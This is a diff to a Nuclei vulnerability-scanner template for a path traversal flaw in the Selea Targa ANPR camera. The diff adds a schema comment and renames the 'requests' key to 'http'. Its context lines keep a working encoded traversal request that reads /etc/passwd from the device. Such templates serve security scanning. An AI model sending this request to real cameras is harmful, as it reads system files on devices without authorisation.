@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: targa-camera-lfi
 info:
   name: Selea Targa IP OCR-ANPR Camera - Local File Inclusion
@@ -11,7 +12,7 @@ info:
     cvss-score: 8.6
     cwe-id: CWE-22
   tags: targa,lfi,iot,camera,selea
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
